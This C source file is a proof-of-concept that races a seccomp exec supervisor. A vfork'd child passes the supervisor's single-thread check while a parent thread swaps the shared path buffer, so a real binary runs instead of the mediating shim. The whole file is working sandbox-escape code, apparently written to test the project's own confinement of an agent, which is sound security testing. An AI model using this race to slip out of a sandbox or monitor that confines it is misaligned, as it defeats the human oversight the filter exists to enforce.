/*
 * vfork_attacker.c — vfork residual bypass POC
 *
 * Demonstrates that the Threads==1 check in the exec filter does not close
 * the TOCTOU race when the agent uses vfork.
 *
 * How the Threads==1 check works:
 *   Before responding CONTINUE on an AllowShim (or any allow) decision the
 *   supervisor now reads /proc/<child_tgid>/status and denies if Threads > 1.
 *   The invariant is: if Threads==1, the trapped thread is the only thread in
 *   its tgid and is paused in the kernel, so no user code in that tgid can
 *   mutate args[0] between our read and the kernel's re-read.
 *
 * Why vfork breaks it:
 *   vfork(2) creates a new process (new tgid, Threads=1 in that tgid) that
 *   *shares the parent's virtual address space* until the child calls exec or
 *   _exit.  Only the calling thread in the parent is suspended; sibling
 *   threads in the parent tgid continue running and can write to any address
 *   in the shared mapping — including the pathname buffer the child passes to
 *   execve.
 *
 *   Timeline:
 *     1. Parent Thread B: running, swapping g_buf between shim_path and
 *        direct_path.
 *     2. Parent Thread A: calls vfork() → child created, Thread A suspended.
 *     3. Child (new tgid, Threads=1): calls execve(g_buf, ...) →
 *        traps to seccomp supervisor.
 *     4. Supervisor: reads /proc/<child_tgid>/status → Threads=1 → CONTINUE.
 *     5. Thread B (still running in parent): may swap g_buf to direct_path.
 *     6. Kernel: re-reads g_buf from shared address space → direct_path →
 *        execs real binary directly.  Bypass.
 *
 * Usage:
 *   vfork_attacker <shim_path> <direct_path> <num_forks>
 *
 * Exit 0 if at least one bypass was observed; exit 1 otherwise.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/wait.h>
#include <stdatomic.h>
#include <time.h>

#define MAX_PATH 4096

/*
 * g_buf lives in the parent's address space.  The vfork'd child shares this
 * mapping, so Thread B's writes are visible to the kernel's post-CONTINUE
 * re-read of the child's args[0].
 */
static char g_buf[MAX_PATH];

struct swap_args {
    char shim_padded[MAX_PATH];
    char direct_padded[MAX_PATH];
    size_t padded_len;
    atomic_int stop;
};

/*
 * Swap thread: alternates g_buf between the shim path (long phase, so the
 * supervisor's initial read sees the shim path) and the direct path (brief
 * phase, targeting the kernel's post-CONTINUE re-read window).
 *
 * This thread runs in the parent's tgid throughout, including while the
 * child's execve is paused waiting for the seccomp supervisor response.
 */
static void *swap_thread(void *arg) {
    struct swap_args *a = arg;
    while (!atomic_load_explicit(&a->stop, memory_order_relaxed)) {
        /* Phase 1 — shim path: long enough for the supervisor to read */
        memcpy(g_buf, a->shim_padded, a->padded_len);
        for (volatile int i = 0; i < 20000; i++) {}

        /* Phase 2 — direct path: brief window for the kernel's re-read */
        memcpy(g_buf, a->direct_padded, a->padded_len);
        for (volatile int i = 0; i < 2000; i++) {}
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr,
                "Usage: %s <shim_path> <direct_path> <num_forks>\n",
                argv[0]);
        return 1;
    }
    const char *shim_path   = argv[1];
    const char *direct_path = argv[2];
    int num_forks = atoi(argv[3]);
    if (num_forks <= 0) num_forks = 300;

    struct swap_args args;
    memset(&args, 0, sizeof(args));
    atomic_init(&args.stop, 0);

    size_t slen = strlen(shim_path) + 1;
    size_t dlen = strlen(direct_path) + 1;
    args.padded_len = slen > dlen ? slen : dlen;
    if (args.padded_len > MAX_PATH) {
        fprintf(stderr, "paths too long\n");
        return 1;
    }
    memcpy(args.shim_padded,   shim_path,   slen);
    memcpy(args.direct_padded, direct_path, dlen);

    /* Prime the buffer with the shim path. */
    memcpy(g_buf, args.shim_padded, args.padded_len);

    /*
     * Spawn Thread B.  This makes the parent multi-threaded.  The child
     * created by vfork will be a *new process* with Threads=1 in its own
     * tgid, so the supervisor's check will pass — but Thread B continues
     * running in the parent and racing g_buf.
     */
    pthread_t swapper;
    if (pthread_create(&swapper, NULL, swap_thread, &args) != 0) {
        perror("pthread_create");
        return 1;
    }

    int bypasses = 0, mediated = 0, denied = 0, other = 0;

    for (int i = 0; i < num_forks; i++) {
        int pipefd[2];
        if (pipe(pipefd) != 0) { perror("pipe"); break; }

        /*
         * vfork: child inherits parent's address space (g_buf is shared).
         * Parent Thread A is suspended until child execs or _exits.
         * Parent Thread B (swap_thread) is NOT suspended and keeps racing.
         */
        pid_t child = vfork();

        if (child == 0) {
            /*
             * CHILD (new tgid, Threads=1 as seen by supervisor).
             * execve(g_buf, ...) traps to supervisor → Threads=1 → CONTINUE.
             * Meanwhile Thread B in the parent races g_buf.
             */
            close(pipefd[0]);
            if (dup2(pipefd[1], STDOUT_FILENO) < 0) _exit(3);
            close(pipefd[1]);

            char *child_argv[] = { g_buf, NULL };
            char *path_env = getenv("PATH");
            char path_buf[MAX_PATH + 8];
            snprintf(path_buf, sizeof(path_buf), "PATH=%s",
                     path_env ? path_env : "/bin:/usr/bin");
            char *child_envp[] = { path_buf, NULL };

            execve(g_buf, child_argv, child_envp);

            /* execve returned — supervisor denied or binary missing. */
            if (errno == EACCES) {
                const char *msg = "DENIED\n";
                write(STDOUT_FILENO, msg, 7);
            } else {
                char msg[64];
                int n = snprintf(msg, sizeof(msg), "EXECVE_FAILED errno=%d\n",
                                 errno);
                write(STDOUT_FILENO, msg, n);
            }
            _exit(1);
        }

        /* Parent Thread A resumes after child execs or _exits. */
        close(pipefd[1]);
        char out[4096];
        memset(out, 0, sizeof(out));
        ssize_t n, total = 0;
        while ((n = read(pipefd[0], out + total,
                         sizeof(out) - 1 - (size_t)total)) > 0)
            total += n;
        close(pipefd[0]);

        int status = 0;
        waitpid(child, &status, 0);

        if (strstr(out, "REAL_BINARY_RAN")) {
            bypasses++;
            fprintf(stderr, "[vfork attempt %3d] BYPASS — real binary ran!\n",
                    i + 1);
        } else if (strstr(out, "MEDIATED_RESPONSE") || strstr(out, "MEDIATED")) {
            mediated++;
        } else if (strstr(out, "DENIED")) {
            denied++;
        } else {
            other++;
        }

        /* Reset buffer to shim_path before next attempt. */
        memcpy(g_buf, args.shim_padded, args.padded_len);
    }

    atomic_store(&args.stop, 1);
    pthread_join(swapper, NULL);

    printf("\n=== vfork Results (%d attempts) ===\n", num_forks);
    printf("  BYPASS (real binary ran): %d\n", bypasses);
    printf("  Mediated (shim ran):      %d\n", mediated);
    printf("  Denied by filter:         %d\n", denied);
    printf("  Other/error:              %d\n", other);

    return bypasses > 0 ? 0 : 1;
}
